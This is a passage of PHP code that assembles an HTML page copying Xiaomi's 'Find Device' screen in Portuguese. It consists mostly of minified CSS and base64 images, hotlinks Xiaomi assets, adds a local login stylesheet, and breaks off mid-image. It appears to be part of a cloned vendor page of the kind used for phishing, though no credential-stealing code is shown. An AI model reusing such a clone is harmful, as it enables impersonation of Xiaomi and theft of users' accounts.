auto;top:100px;padding-bottom:24px}.ant-modal-wrap{position:fixed;overflow:auto;top:0;right:0;bottom:0;left:0;z-index:1000;-webkit-overflow-scrolling:touch;outline:0}.ant-modal-title{margin:0;font-size:16px;line-height:22px;font-weight:500;color:rgba(0,0,0,.85)}.ant-modal-content{position:relative;background-color:#fff;border:0;border-radius:4px;background-clip:padding-box;-webkit-box-shadow:0 4px 12px rgba(0,0,0,.15);box-shadow:0 4px 12px rgba(0,0,0,.15)}.ant-modal-close{cursor:pointer;border:0;background:transparent;position:absolute;right:0;top:0;z-index:10;font-weight:700;line-height:1;text-decoration:none;-webkit-transition:color .3s;transition:color .3s;color:rgba(0,0,0,.45);outline:0;padding:0}.ant-modal-close-x{display:block;font-style:normal;vertical-align:baseline;text-align:center;text-transform:none;text-rendering:auto;width:56px;height:56px;line-height:56px;font-size:16px}.ant-modal-close-x:before{content:"\E633";display:block;font-family:anticon!important}.ant-modal-close:focus,.ant-modal-close:hover{color:#444;text-decoration:none}.ant-modal-header{padding:16px 24px;border-radius:4px 4px 0 0;background:#fff;color:rgba(0,0,0,.65);border-bottom:1px solid #e8e8e8}.ant-modal-body{padding:24px;font-size:14px;line-height:1.5;word-wrap:break-word}.ant-modal-footer{border-top:1px solid #e8e8e8;padding:10px 16px;text-align:right;border-radius:0 0 4px 4px}.ant-modal-footer button+button{margin-left:8px;margin-bottom:0}.ant-modal.zoom-appear,.ant-modal.zoom-enter{-webkit-animation-duration:.3s;animation-duration:.3s;-webkit-transform:none;transform:none;opacity:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.ant-modal-mask{position:fixed;top:0;right:0;left:0;bottom:0;background-color:rgba(0,0,0,.65);height:100%;z-index:1000;filter:alpha(opacity=50)}.ant-modal-mask-hidden{display:none}.ant-modal-open{overflow:hidden}.ant-modal-centered{text-align:center}.ant-modal-centered:before{content:"";display:inline-block;height:100%;vertical-align:middle;width:0}.ant-modal-centered .ant-modal{display:inline-block;vertical-align:middle;top:0;text-align:left}.ant-modal-centered .ant-table-body{white-space:nowrap;overflow-x:auto}@media (max-width:767px){.ant-modal{width:auto!important;margin:10px}.ant-modal-centered .ant-modal{-webkit-box-flex:1;-ms-flex:1;flex:1 1}}.ant-confirm .ant-modal-close,.ant-confirm .ant-modal-header{display:none}.ant-confirm .ant-modal-body{padding:32px 32px 24px}.ant-confirm-body-wrapper{zoom:1}.ant-confirm-body-wrapper:after,.ant-confirm-body-wrapper:before{content:"";display:table}.ant-confirm-body-wrapper:after{clear:both}.ant-confirm-body .ant-confirm-title{color:rgba(0,0,0,.85);font-weight:500;font-size:16px;line-height:1.4;display:block;overflow:hidden}.ant-confirm-body .ant-confirm-content{margin-left:38px;font-size:14px;color:rgba(0,0,0,.65);margin-top:8px}.ant-confirm-body>.anticon{font-size:22px;margin-right:16px;float:left}.ant-confirm .ant-confirm-btns{margin-top:24px;float:right}.ant-confirm .ant-confirm-btns button+button{margin-left:8px;margin-bottom:0}.ant-confirm-error .ant-confirm-body>.anticon{color:#f5222d}.ant-confirm-confirm .ant-confirm-body>.anticon,.ant-confirm-warning .ant-confirm-body>.anticon{color:#faad14}.ant-confirm-info .ant-confirm-body>.anticon{color:#1890ff}.ant-confirm-success .ant-confirm-body>.anticon{color:#52c41a}</style><style type="text/css">.ant-popover{font-family:Chinese Quote,-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif;font-size:14px;-webkit-font-feature-settings:"tnum";font-feature-settings:"tnum";font-variant:tabular-nums;line-height:1.5;color:rgba(0,0,0,.65);-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;padding:0;list-style:none;position:absolute;top:0;left:0;z-index:1030;cursor:auto;-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text;user-select:text;white-space:normal;font-weight:400;text-align:left}.ant-popover:after{content:"";position:absolute;background:hsla(0,0%,100%,.01)}.ant-popover-hidden{display:none}.ant-popover-placement-top,.ant-popover-placement-topLeft,.ant-popover-placement-topRight{padding-bottom:10px}.ant-popover-placement-right,.ant-popover-placement-rightBottom,.ant-popover-placement-rightTop{padding-left:10px}.ant-popover-placement-bottom,.ant-popover-placement-bottomLeft,.ant-popover-placement-bottomRight{padding-top:10px}.ant-popover-placement-left,.ant-popover-placement-leftBottom,.ant-popover-placement-leftTop{padding-right:10px}.ant-popover-inner{background-color:#fff;background-clip:padding-box;border-radius:4px;-webkit-box-shadow:0 2px 8px rgba(0,0,0,.15);box-shadow:0 2px 8px rgba(0,0,0,.15)}.ant-popover-title{min-width:177px;margin:0;padding:5px 16px 4px;min-height:32px;border-bottom:1px solid #e8e8e8;color:rgba(0,0,0,.85);font-weight:500}.ant-popover-inner-content{padding:12px 16px;color:rgba(0,0,0,.65)}.ant-popover-message{padding:4px 0 12px;font-size:14px;color:rgba(0,0,0,.65)}.ant-popover-message>.anticon{color:#faad14;line-height:1.6;position:absolute}.ant-popover-message-title{padding-left:22px}.ant-popover-buttons{text-align:right;margin-bottom:4px}.ant-popover-buttons button{margin-left:8px}.ant-popover-arrow{background:#fff;width:8.48528137px;height:8.48528137px;-webkit-transform:rotate(45deg);transform:rotate(45deg);position:absolute;display:block;border-color:transparent;border-style:solid}.ant-popover-placement-top>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-topLeft>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-topRight>.ant-popover-content>.ant-popover-arrow{bottom:5.5px;-webkit-box-shadow:3px 3px 7px rgba(0,0,0,.07);box-shadow:3px 3px 7px rgba(0,0,0,.07)}.ant-popover-placement-top>.ant-popover-content>.ant-popover-arrow{left:50%;-webkit-transform:translateX(-50%) rotate(45deg);transform:translateX(-50%) rotate(45deg)}.ant-popover-placement-topLeft>.ant-popover-content>.ant-popover-arrow{left:16px}.ant-popover-placement-topRight>.ant-popover-content>.ant-popover-arrow{right:16px}.ant-popover-placement-right>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-rightBottom>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-rightTop>.ant-popover-content>.ant-popover-arrow{left:6px;-webkit-box-shadow:-3px 3px 7px rgba(0,0,0,.07);box-shadow:-3px 3px 7px rgba(0,0,0,.07)}.ant-popover-placement-right>.ant-popover-content>.ant-popover-arrow{top:50%;-webkit-transform:translateY(-50%) rotate(45deg);transform:translateY(-50%) rotate(45deg)}.ant-popover-placement-rightTop>.ant-popover-content>.ant-popover-arrow{top:12px}.ant-popover-placement-rightBottom>.ant-popover-content>.ant-popover-arrow{bottom:12px}.ant-popover-placement-bottom>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-bottomLeft>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-bottomRight>.ant-popover-content>.ant-popover-arrow{top:6px;-webkit-box-shadow:-2px -2px 5px rgba(0,0,0,.06);box-shadow:-2px -2px 5px rgba(0,0,0,.06)}.ant-popover-placement-bottom>.ant-popover-content>.ant-popover-arrow{left:50%;-webkit-transform:translateX(-50%) rotate(45deg);transform:translateX(-50%) rotate(45deg)}.ant-popover-placement-bottomLeft>.ant-popover-content>.ant-popover-arrow{left:16px}.ant-popover-placement-bottomRight>.ant-popover-content>.ant-popover-arrow{right:16px}.ant-popover-placement-left>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-leftBottom>.ant-popover-content>.ant-popover-arrow,.ant-popover-placement-leftTop>.ant-popover-content>.ant-popover-arrow{right:6px;-webkit-box-shadow:3px -3px 7px rgba(0,0,0,.07);box-shadow:3px -3px 7px rgba(0,0,0,.07)}.ant-popover-placement-left>.ant-popover-content>.ant-popover-arrow{top:50%;-webkit-transform:translateY(-50%) rotate(45deg);transform:translateY(-50%) rotate(45deg)}.ant-popover-placement-leftTop>.ant-popover-content>.ant-popover-arrow{top:12px}.ant-popover-placement-leftBottom>.ant-popover-content>.ant-popover-arrow{bottom:12px}</style><style type="text/css">.ant-modal,.ant-popover{font-family:\\5C0F\7C73\5170\4EAD,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft Yahei,Hiragino Sans GB,Heiti SC,WenQuanYi Micro Hei,sans-serif!important}.ant-input-sm{height:28px}.ant-btn-danger{color:#fff;background-color:#fa3f32}@media (min-width:769px){.ant-modal .ant-modal-close-x{font-size:18px!important;color:#4d4d4d}}.ant-modal .ant-modal-title{color:#000}@media (max-width:768px){.ant-modal{width:90%!important;margin:0 auto}.ant-modal .ant-modal-close-x{font-size:22px!important}}@media (max-width:768px){.ko-warning .ant-modal-body{padding:45px 43px;font-size:14px}.ko-warning .ko-text{font-size:14px;line-height:20px}}.mic-popup .ant-popover-inner-content{background:#fff;-webkit-box-shadow:0 3px 6px 0 rgba(0,0,0,.1);box-shadow:0 3px 6px 0 rgba(0,0,0,.1);border-radius:3px}.mic-popup .ant-popover-arrow{width:12px;height:12px}.mic-popup.ant-popover-placement-top .ant-popover-arrow{border-right:1px solid #b3b3b3;border-bottom:1px solid #b3b3b3}.mic-popup.ant-popover-placement-top>.ant-popover-content>.ant-popover-arrow{bottom:3px!important}.mic-popup.ant-popover-placement-bottomLeft .ant-popover-arrow{border-left:1px solid #b3b3b3;border-top:1px solid #b3b3b3}.mic-popup.ant-popover-placement-bottomLeft>.ant-popover-content>.ant-popover-arrow,.mic-popup.ant-popover-placement-bottomRight>.ant-popover-content>.ant-popover-arrow{top:3px!important}.mic-popup.with-border .ant-popover-inner-content{border:1px solid #b3b3b3}.mic-popup.with-border.ant-popover-placement-bottomRight .ant-popover-arrow{border-left:1px solid #b3b3b3;border-top:1px solid #b3b3b3}.mic-popup.with-border.ant-popover-placement-bottomLeft>.ant-popover-content>.ant-popover-arrow,.mic-popup.with-border.ant-popover-placement-bottomRight>.ant-popover-content>.ant-popover-arrow{top:4px!important}.mic-popup.with-border.ant-popover-placement-top>.ant-popover-content>.ant-popover-arrow{bottom:4px!important}</style>';
	$html .= "\n" . '<link type="text/css" rel="stylesheet" href="//land.xiaomi.net/mcfe/find-device/main.6556f5be.css">';
	$html .= "\n" . '<link type="text/css" rel="stylesheet" href="' . site_url('assets/css/login_sgp.css?t=' . time()) . '">';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/jquery-1.10.2.js"></script>';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/ui/1.12.1/jquery-ui.js"></script>';
	$html .= "\n" . '</head>';
	$html .= "\n" . '';
	$html .= "\n" . '<body class="pt_BR">';
	$html .= "\n" . '<div id="Loading" style="display:inline">';
	$html .= "\n" . '<div id="root"><div class="app"><div class="main"><div class="modal-portal"></div><div class="loader-page-bsx69"><div class="loading-2UO55"><div class="content-2Z7qF"><img class="fixed-3edTc" src="//land.xiaomi.net/mcfe/find-device/loading-fixed.e1e50fce.png" width="100%"><img class="spinning-1n6Xy" src="//land.xiaomi.net/mcfe/find-device/loading-spinning.0bb6434d.png" width="100%"></div><div class="title-2OQJx"><span>Find Device...</span></div></div></div><div class="no-device-panel-3YVjF"><div class="content-2p5PC"><img class="img-x3yx_" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlgAAAG/CAMAAACzEVlJAAAAjVBMVEUAAAAAAAAAAAAAAAAAAAD5+fkAAAAAAAD8/Pzy8vL19fXz8/PKysr6+vrl5eX////w8PD////+/v77+/v5+fn8/Pz9/f3////////+/v7////6+vr////k5OT////i4uL+/v7f39/h4eHx8fH8/Pz19fXz8/Pd3d36+vr39/fw8PDs7Oz5+fnu7u7o6OgKq/frAAAAHXRSTlMBBAcKDYMRD4KEhFcTjCTYMvTNdmi+m+jh3duo31iQnmsAAA7ISURBVHja7NrtattAEIXhnQWDaNImISXkj8VCRf+k9399teO1sCyrjgNSz1HehxDy4YGsOTuzWTsBAAAAAAAAAAAAAAAAAAAAAAAAAAAsKjCT9CUFppAwIuUkrVngJqSLUNlIqxIQktYioCb5C0hK3gKykq+AtGQqoC4ZChhIbgImkpWAjWQk4CS5CHhJHuIGGTOJvTUlK4iUkPUki1DpWUWyCJUk+2TF0OPPTXNqg/+mGXi+u3dKVgzcPbQXlbaU3acPoH6++u7l3iZZMfBd64mk/tzro0mwYuC5hbjXe49kxakfT/0uub7j+sed1lA/e/2LxTAcDcJbFj9G/fz1ncMxK4YeWui78wvWU7t3fVeNH1O/p36B+mf9O4c4055SGwHU168bv2BNHiI/+DPql6hv5C/g41z7Gbp3PiutdwzWYHfcfA4o1C9R36i/ZhgjEwuui9qZfDIOqJ+53jVY5dJCJhc/3oHUL1HfiL/NIcbK9M4aLn7id9QvUO8YrIkdNd49E08E9UvUN9rvzIoL+kV98m6G+pnrTYOV/z3nd67ctVC/RP3GL1jHBfzeQs5bV4O3ycrJirGc6275s4Wgt9q5DIO171Y0LFl1TG5ytgpWzsdR+GsLRfWctcnCLSsuBqs9IFia+o4l3LJiJO+UPTqWqnrGcgwWHUvZ8bohCydrnCs6lrzasRyDxeFd2eHwLh2sy5PwcPPOKFR1GqxsEqzMKNTXn7F0W9Y4WIxCff0ZS7dlESxHtWM5BSszCg3od6yYCFZLsJSVd47BomNJG47C7BQszljKyoFRsHJVuMdS1gdLdhaOgsUodFBHoWOwGIXK+pt31VkYdCxLpRAsbLcEKxMsCwQLewSLYHkgWJhFV7rdB8HCzB0r2wSrI1jK+mCptiw6lieChVmUna5031yClXuHP7wjWJrcOlamY3konWuwOLxLo2PhHR3r6P0CjmCpUu9YweHdk/p/hcEo9KQ+CqeD1TEKlZWudizR13ToWKaOHcsvWB1nrL/sne1u0zAUQKXCJAZooPGxP8ROsoy5a9r3fzwcaro1zkdNneS6PacVT3B07rVdMcmkWyzusUST56mKxXWDaPa/x0pxFOaVhVEolapKVSxGoWjynOUdGhiF3GOlQLqnQp50RJOwWCzvkkl6eadYcqnyypJisTgViibdUVgxCiXDWyHsYRTypJMCCS/vjELJJL1jUSy5UCyYhKpKdcdieRdNpVIVi+VdNOmeChmFokl4FCKWZBI+FbJjSYZiwTE6DtWe2/TE4mcz09iUxfmkKxbFioKnUyQYhVfMG6MoFmJFwjnk6XT1OxZinUOjEsVCrAm0oliINYFWFGtMrJcMwtCZplgUKzpaz1Msg1jXhNYUC7EmoDGHHYsdKzZ6tmKZythvwmJRrAB0lGKdhNlz+w6xrgA9U7F8sRyIdZE4cQKKdcVisWMF9EpSsULlolhi0QE71nRiCfkLFYgVDS2vWJLFYhQGBmukWIhFsWIWK1ivcgRTG/utEevyOa9YZSCmdsVqWB1ArItDO3p3rEhKOWytGpxYR6QhFjvWiejBU2Ecp/xiIdbFM1CsWFb5O1bCxWIUhgfLL5ZHeS61xdQU6+LRIcUquyiCqNe1/a6tWA5hr9EUa4ZitehTqgz4FHXdK5aIgyHFmrtYnlQHpQIoCyuV/davYgl7NESsyYt1RJdU/1Ws9doXS5JajMJZi9XSqizCi+VY77l93ytWmFkUSya68x6rR6tss31ps91uX+znZNxPk398PHBzzIc93z7dnaIWYglF+8Vy/3pebYyaly/fx81CLKGcUCxXq1rNz/3duFnsWBLRncXKOryq1BI8fB0zi2KJRHeeCn2vtFHL8OvzsFmIJRO/WN17+2/1F/P0OBdPTuWfY3sWo1AiY8VyXmWqodpkc7KplCW/GzaLYolkpFilY6ss+S6bl12uLDeDtw6IJZOuYvliFWtlmX8GPCrLPWIlSFexfK+KSll22dzslOVh8A4esWTSVSzfq0I1ZPOjLPng6w5iycQvlt+rhcVSg++GiCUTv1i+WCViIdZ5xeoMlqRi+WYhlkwGivXPK5ssxEKsaMUqRRbLMwuxRKJbycq8YAkrFmKlgW4Vy9+wpBWrbRZiiaS/WK9zsEQsxKJYiCWC3mI5rQQWq2UWYonEK1ZLLIHFWlAsYyqDWBGKVTQg1ptiGSsXYoUXqyNY8sTyzGIUyqPvv24vBRdrMbEMYsUpVnEo1vOiYq2EiEWxIhWraECsA4Yd66xi+SvW88JiDZtFsQTSKpa/YiEW1w3nFstfsYoSsbhuiF4sq5XzanGxViLE4lQYr1iIxfIesVil8GK1zWLHEoc+0PUCjVjsWPGL9bq6CxBrJUIsihWjWFYpxGLHmqBY9oNYnAop1gyj0EKxKBajcDmGrrEczyLEWgkQi7fCSMVCrFaxGIURilVQLJb3OMXyVyyxYr01i2JJpPtQKL5Yx2KxvMuDYnHzvodiMQpTgGIxCvdQLMRKAYr1h107OKkoCIIoGol7B8b801Oorcj0qi04N4bi9Pi+TmEi1m/D8lvhf+svsQyLWMQyrP8VsSbD8h2LWMQaRiyfGxoiFrESsQyrIWIZViKWYTVELMNKxFof1teHiEWsx4hlWA0Ry7ASsdaH5Y1FLGI9RyzDaohYTmEi1vqwiEUsw3qOWIbVELG8sRKxDKshYjmFiVjrwyIWsYj1HLHWh0UsYhnWc8RaH5ZTSCxiPUcsw2qIWE5hIpZhNUQspzARy7AaIpZTmIi1PixiEcuwniOWYTVELMNKxDKshohlWIlYhtUQsQwrEcuwGiKWYSViGVZDxDKsRKz1YfkRmljEeo5YhtUQsQwrEcuwGiKWYSVi7Q3rGhaxiDWMWMRqiFjESsRaHNa9n9ewiEWsQcTyxmqIWLNh3c97DYtYTuFzxFocFrGI5a/CYcTyxmqIWN5YiVibp/AnYhHLKRxELKewIWJNxHIKieUnnWHE8sZqiFiGlYjly3tDxPIdKxHLKWyIWIaViLU4LG8sYvl/rGHE8uW9IWJ5YyVieWM1RCynMBHLKWyIWMRKxDKshojl8Z6IRayGiGVYiViG1RCxDCsRa29Yx7CIRaxhxDKshog1G9a55xgWsYj1HLEMqyFiGVYi1uKwzrnHsL7Zs4MTBIIgiKIMpmP+8blSeNDL2mgv0/B+DMWbdiWW470QsTyFEyKWL++JWMSaELEqYrmxiEWsYsTyuWFCxPK5IRHLr8IJEcvxnojlxpoQsdxYiVjEmhCx3FiJWH4VTohYlWE9IxaxPIWFiOW/wgkRy1OYiOV4nxCxiJWI5XifELF8eU/E8hROiFiGlYjVPKzlxiJWagaLWMRqHtbdsIhFrGLEMqwJEeujZVjEOjKsTSPW6UvocwOxOsAiFrEMa5+I9dYyLGIdGda2EetkV4ZFLMPaKGKl7MqwiJXawTIsYrWDdTMsYhlWNWJlWKl7V4ZFLMPaKmK9WoZFrIZhLcMi1tE1YBkWsX5sGRaxGoa1vnkJDYtY/wHLsB7s3WFvmkAYwPF4R+qSruu6bC+6xhsJYhRHv//H2+E/dHJe8Ew5DuH5sehK4Q35+3ittpWJ9TkrCQuRJtbCwlrBQzk0ysOhPJRl/UfchqLcpuYZ1qqHgi+sRrmx0122/m2hYa1wY1h2Wh1OU6s+CtzmvdmAzWZeYQV35YZ1KNEEBtBbs4GP23vnGI6b+fkeu3LXKM5U1aLD0uCpEGUbmRMae9vJ1t67MbJv3ucDFMUtqKqq61mFFRQUNFB60ViIJZ2/Y0I194SFYlegKoq6qhOHpUcJS10PS4QhpTYuMKdsWfMN60pQ0K4sy0ouFLhwYL/zKOVYjsOSzudAB0k16pNJhKXihHWtKJrCTgQrTtOJAYWPpqqam2PzxfVcw1ISVhxUZXXjqoqq/nCs66mFNdQSq68nkgK8j0Ls2Oy/nv0LPL9VnU8r63gyjYmlBg8rvCsUXDYeiVzJj/+Dzzn7wQnLOb+jqnA2rBYQ1rWisF6vCxGsQlHxUW2bsjdEZdXzn1h9RWF98vDwUHChGOt+fL69d/Yv6XwW6C4blL1pvVvpv0FqDRdWeFeERVlVl//i9xyzpPNr2MAKe9NyXzo8zjWsr08/tkZEkHdtz+xbfy176OzCUurbbyOAeGGxEZbdZh7WLyOA8SYW5hmWUt+NAEaZWMysbljvm7GxtosV1k8jgPgTCxcTq9iMrTCNobpyw/piRCx54CKLg8ceWe+5MUbCukfXJxZlcfT2uBnTcWssCese5QGLLMLCvizGUu7NiYR1j9yuOpyJlYyiKwnrjuRdpjOxWGQ1JCxxm/zaImsCYb0M+ExIWJCwIsoDF1m5SeeZriSse5JfXWSR1tak8zZ8WJCw4skd5nJiwaTz6D4TSljTl7u2yLljYjVyk8orXUUIS17SiSVsjZX4ufAxWljyInQsfRMLtqjEZT0N3BVhQd42E01+oZ1YEynrSQ8cFmVB3ugXTX7BO7FSrbNeHxVdDR4W5K3JkfjDAvbghZ39dsS2Xp7fHjXzarRfEqkCaPE5PT8HNZR1K/tPd6jRwoKStCLzl4Vhu8oADfi7Sj6yJK5PygYvaw1kCO+KsAbSU5bENY7MH1jr5qiQJewKPWVJXaPIetLCDU0h89OAwmrUsFxKDCc0MFdYPi7to1qRuiIsSStI+rJwE93fVaSwsJK0kolcmO7rClH/go6kdbs7GF4aaQYWZUlbyWh4RMpKAfH/rKrElYjuExhMONUxtbAkriBT+4aNcl12NYWyJC/XhMtSfquLsCZTlhTmmlhaqoevq8mV9a+dOjZiGAQCIPh8/0U7coCMsQIjAdqt4eZkVpmjrOxqhzV3WZwwuLTMKbpS1uUGjix/K0fxpqzV5X3KQdWVslaX9ygNUZHW4vJ6pS1qytpMDlQ64oO0NjMoqL5okdZuBrTUF19IazuDg6pFh7b208nnr6JPWizRlbieIc4SFytkJa+dxTwK24hlFNYRPFCpiIrp6wp40xMAAAAAAAAAAAAAAMANXtWKwNKXoVlwAAAAAElFTkSuQmCC" width="67.778%"><p class="title-3BUlK"><span>Nenhum dispositivo</span></p><p class="message-BM5OB"><span>Ative o "Encontrar dispositivo" para poder localizar seus dispositivos.</span></p></div></div><div class="map-container"><div class="no-location-panel-2Ey9z"><div class="content-2p5PC"><img class="img-x3yx_" src="data:image/png;base64,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